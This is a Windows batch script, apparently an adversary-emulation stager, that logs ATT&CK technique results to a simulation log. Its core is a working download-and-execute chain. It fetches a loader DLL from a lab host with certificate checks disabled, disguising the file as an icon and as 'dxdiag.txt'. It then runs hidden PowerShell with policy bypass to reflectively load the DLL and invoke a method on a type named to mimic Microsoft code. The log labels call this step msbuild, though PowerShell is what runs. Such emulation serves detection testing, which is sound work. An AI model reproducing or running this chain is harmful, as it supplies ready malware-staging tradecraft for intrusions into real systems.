@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder variable declarations
SET akjdh=%APPDATA%\10253\716118de
SET mnbvf=dxdiag.txt
SET qwzxc=https://10.0.0.49/stage/2/icon.png?10253-7
SET plkmj=ITZEL-S2BO
SET vbnmc=10253
SET ghzxp=7
SET zxmqp=%APPDATA%\7\macula-simulations.log
SET bnmcv=%APPDATA%\7
SET lkjhg=Microsoft.Win32.TaskScheduler.NativeBridge
SET poiuyt=Dale

REM Log T1027 obfuscation success (script is already obfuscated)
echo [%date% %time%][TTP][!plkmj!][!vbnmc!]: T1027|Obfuscated Files or Information=[OK]:[] >> "!zxmqp!"

REM Ensure output directory exists
if not exist "!akjdh!" mkdir "!akjdh!"

REM Heartbeat fetch (download Loader DLL)
echo [%date% %time%][DEBUG][!plkmj!][!vbnmc!]: heartbeat_start >> "!zxmqp!"
curl -k -s -o "!akjdh!\!mnbvf!" "!qwzxc!"
echo [%date% %time%][DEBUG][!plkmj!][!vbnmc!]: heartbeat_complete >> "!zxmqp!"

REM Change to output directory
cd /d "!akjdh!"
echo [%date% %time%][DEBUG][!plkmj!][!vbnmc!]: chdir_result=!errorlevel! >> "!zxmqp!"

REM PowerShell invocation (LOLBIN proxy)
echo [%date% %time%][DEBUG][!plkmj!][!vbnmc!]: msbuild_start >> "!zxmqp!"
powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10253\716118de\dxdiag.txt')).GetType('Microsoft.Win32.TaskScheduler.NativeBridge').GetMethod('Dale').Invoke($null, $null) }"

REM Log TTP result for system binary proxy execution
set errlvl=!errorlevel!
if !errlvl! equ 0 (
    echo [%date% %time%][TTP][!plkmj!][!vbnmc!]: T1218|System Binary Proxy Execution=[OK]:[] >> "!zxmqp!"
) else (
    echo [%date% %time%][TTP][!plkmj!][!vbnmc!]: T1218|System Binary Proxy Execution=[FAIL]:[msbuild_execution_failed] >> "!zxmqp!"
)

exit /b 0